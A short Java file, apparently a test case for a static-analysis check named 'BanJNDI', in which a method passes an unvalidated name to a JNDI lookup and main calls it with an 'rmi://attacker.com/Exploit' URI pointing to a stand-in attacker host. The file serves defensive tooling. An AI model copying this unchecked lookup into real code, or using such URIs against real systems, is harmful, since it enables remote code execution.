import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.NamingException;

class JndiExample {

    public String showBug(String jndiName) throws NamingException {
        Context ctx = new InitialContext();
        Object obj = ctx.lookup(jndiName); // BUG: BanJNDI
        return obj.toString();
    }

    public static void main(String[] args) {
        try {
            JndiExample example = new JndiExample();
            String vdiektfz = example.showBug("rmi://attacker.com/Exploit");
            System.out.println(vdiektfz);
        } catch (NamingException e) {
            e.printStackTrace();
        }
    }
}